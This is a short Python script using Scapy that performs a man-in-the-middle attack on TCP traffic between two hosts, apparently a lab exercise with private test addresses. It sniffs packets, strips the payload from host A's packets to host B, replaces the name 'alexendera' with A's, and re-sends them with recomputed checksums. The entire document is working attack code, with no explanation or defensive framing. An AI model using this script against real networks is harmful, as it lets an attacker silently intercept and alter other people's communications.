#!/usr/bin/python3
from scapy.all import *

VM_A_IP = '10.9.0.5'
VM_B_IP = '10.9.0.6'

def spoof_pkt(pkt):
    if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
        newpkt = IP(bytes(pkt[IP]))
        del (newpkt.chksum)
        del (newpkt[TCP].chksum)
        del (newpkt[TCP].payload)
        
        data = str(pkt[TCP].payload.load.decode())

        print(data)

        name = 'alexendera'
        
        newdata = data.replace(name, 'A'*len(name))
        newdata = newdata.encode()

        send(newpkt/newdata)
        
    elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)

pkt = sniff(filter='tcp', prn=spoof_pkt)
